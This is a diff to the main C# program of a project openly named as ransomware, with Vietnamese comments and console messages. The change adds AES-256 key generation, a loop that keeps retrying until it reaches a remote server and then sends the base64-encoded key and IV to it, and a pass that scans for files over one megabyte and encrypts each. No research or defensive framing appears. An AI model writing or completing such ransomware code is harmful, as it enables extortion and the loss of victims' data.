@@ -5,17 +5,40 @@
 using Ransomware.Sources.Application;
 class Program
 {
-    static async Task Main()
+    static void Main()
     {
-        var scanner = new FileExplorer(); // Tạo một đối tượng FileExplorer
-        var fileDetails = scanner.Scan(1024 * 1024, FileExplorer.SortOrder.Descending); // Quét thư mục gốc
+        bool connected = false;
+
+        var aes = new AesCipher(256);
+        var network = new NetworkClient();
+        var fileExplorer = new FileExplorer(aes);
+
+        while (!connected)
+        {
+            connected = network.Connect();
+
+            if (connected)
+            {
+                string message = Convert.ToBase64String(aes.Key) + "|" + Convert.ToBase64String(aes.IV);
+                network.SendData(message);
+                network.Disconnect();
+            }
+            else
+            {
+                Console.WriteLine("Kết nối thất bại. Đang thử lại...");
+                Thread.Sleep(2000); // Đợi 2 giây trước khi thử lại
+            }
+        }
+
+        var fileDetails = fileExplorer.Scan(1024 * 1024, FileExplorer.SortOrder.Descending);
 
         Console.WriteLine($"Số lượng file cụ thể được lưu: {fileDetails.Count}");
+
 
         foreach (var fileDetail in fileDetails)
         {
             Console.WriteLine($"{fileDetail.FilePath} - {fileDetail.FormatSize()}");
-            await Task.Delay(300);
+            fileExplorer.EncryptFile(fileDetail.FilePath, fileDetail.Size);
         }
     }
 }
